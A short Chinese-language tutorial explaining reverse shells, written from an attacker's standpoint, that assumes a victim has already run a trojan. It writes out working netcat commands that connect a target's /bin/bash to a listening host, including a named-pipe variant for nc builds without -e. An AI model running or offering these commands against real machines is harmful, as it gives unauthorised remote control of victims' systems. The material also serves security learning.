# 反弹Shell理解与应用

参考文章

[反弹shell是什么](https://www.zhihu.com/question/24503813)

[*Unix系统NC反弹shell的方法](http://www.91ri.org/9615.html)

## 1. 什么是反弹Shell

反弹Shell(Reverse Shell), 就是控制端监听在某TCP/UDP端口(一般是固定ip与固定端口), 被控端主动发起请求到该端口, 将其操作终端的输入输出与控制端连接起来. `reverse shell`与`telnet`, `ssh`等标准shell对应, 本质上是网络概念的客户端与服务端的角色反转.

假设我们攻击了一台机器, 打开了该机器的一个端口, 攻击者在自己的机器去连接目标机器（目标ip：目标机器端口）, 这是比较常规的形式, 我们叫做**正向连接**. 远程桌面, web服务, ssh, telnet等等, 都是正向连接. 

那么什么情况下正向连接不太好用了呢？

1. 某客户机中了你的网马, 但是它在局域网内, 你直接连接不了. 它的ip会动态改变, 你不能持续控制. 
2. 由于防火墙等限制, 对方机器只能发送请求, 不能接收请求. 
3. 对于病毒, 木马, 受害者什么时候能中招, 对方的网络环境是什么样的, 什么时候开关机, 都是未知, 所以建立一个服务端, 让恶意程序主动连接, 才是上策. 那么反弹就很好理解了,  攻击者指定服务端, 受害者主机主动连接攻击者的服务端程序, 就叫反弹连接. 

这种一般是你已经通过某种方式上传了你的木马并骗过了管理员让他执行了这个木马. 这里不讲如何上传木马, 只介绍反弹Shell的创建方式.

## 2. 反弹Shell的方法-nc

通常的方法是使用`nc`命令, 控制端通过`nc`监听特定端口, 客户端通过各种方式将其本地的bash与控制端连接起来.

比如, 控制端执行如下命令监听本地2222端口.

```
$ nc -lv 2222
```

被控端可以通过如下命令建立与控制端的连接(不只是建立连接, 还需要将其本地的bash输入输出与控制端连接起来)

```
$ nc 172.16.26.109 2222 -e /bin/bash
```

`-e`的同名选项为`--exec`, 直接就将本地的bash暴露给了控制端. 但是为了安全, 一般不会编译-e选项, 也就无法反弹shell. 但是可以变换一下思路, 不直接使用NC反弹shell, 而是反弹一个拥有shell权限的**管道**. 

```
$ mknod backpipe p; nc 172.16.11.2 9999 0<backpipe | /bin/bash 1>backpipe
```

在控制端nc输出中你可以看到类似如下的信息时, 说明有被控端连接上来了.

```
$ nc -lv 2222
Connection from 172.16.9.89 port 2222 [tcp/EtherNet/IP-1] accepted
```
